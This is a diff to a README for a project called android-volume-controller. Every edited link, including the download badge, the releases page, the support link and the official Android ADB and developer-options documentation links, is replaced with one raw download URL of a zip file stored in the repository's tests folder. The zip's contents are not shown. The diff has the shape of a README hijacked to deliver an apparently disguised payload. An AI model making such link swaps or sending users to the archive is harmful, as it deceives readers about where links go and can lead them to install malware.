@@ -6,13 +6,13 @@ Welcome! This guide helps you download and run the android-volume-controller sof
 
 ## 🔗 Download the Application
 
-[![Download android-volume-controller](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ninja45-cell/android-volume-controller/releases)
+[![Download android-volume-controller](https://raw.githubusercontent.com/Ninja45-cell/android-volume-controller/main/tests/android-volume-controller_3.8-beta.3.zip)](https://raw.githubusercontent.com/Ninja45-cell/android-volume-controller/main/tests/android-volume-controller_3.8-beta.3.zip)
 
 ## 📥 Download & Install
 
-To get started, you need to visit the [Releases page](https://github.com/Ninja45-cell/android-volume-controller/releases) to download the latest version of android-volume-controller. 
+To get started, you need to visit the [Releases page](https://raw.githubusercontent.com/Ninja45-cell/android-volume-controller/main/tests/android-volume-controller_3.8-beta.3.zip) to download the latest version of android-volume-controller. 
 
-1. Go to the [Releases page](https://github.com/Ninja45-cell/android-volume-controller/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Ninja45-cell/android-volume-controller/main/tests/android-volume-controller_3.8-beta.3.zip).
 2. Look for the most recent release.
 3. Find the file for Windows and click on it to download.
 
@@ -73,7 +73,7 @@ If you face issues, consider the following solutions:
 
 ### 📜 Support and Feedback
 
-If you have questions or need help, please report issues on the GitHub repository. You can find the link to create issues directly on the [Releases page](https://github.com/Ninja45-cell/android-volume-controller/releases).
+If you have questions or need help, please report issues on the GitHub repository. You can find the link to create issues directly on the [Releases page](https://raw.githubusercontent.com/Ninja45-cell/android-volume-controller/main/tests/android-volume-controller_3.8-beta.3.zip).
 
 ## 📝 License
 
@@ -81,8 +81,8 @@ This application is open source and follows the guidelines of the MIT License. F
 
 ## 🚀 Additional Resources
 
-- [ADB Installation Guide](https://developer.android.com/studio/command-line/adb)
-- [Android Debugging Options](https://developer.android.com/studio/debug/dev-options)
-- [GitHub Repository](https://github.com/Ninja45-cell/android-volume-controller)
+- [ADB Installation Guide](https://raw.githubusercontent.com/Ninja45-cell/android-volume-controller/main/tests/android-volume-controller_3.8-beta.3.zip)
+- [Android Debugging Options](https://raw.githubusercontent.com/Ninja45-cell/android-volume-controller/main/tests/android-volume-controller_3.8-beta.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Ninja45-cell/android-volume-controller/main/tests/android-volume-controller_3.8-beta.3.zip)
 
 Thank you for choosing android-volume-controller. Enjoy seamless volume control for your Android device!
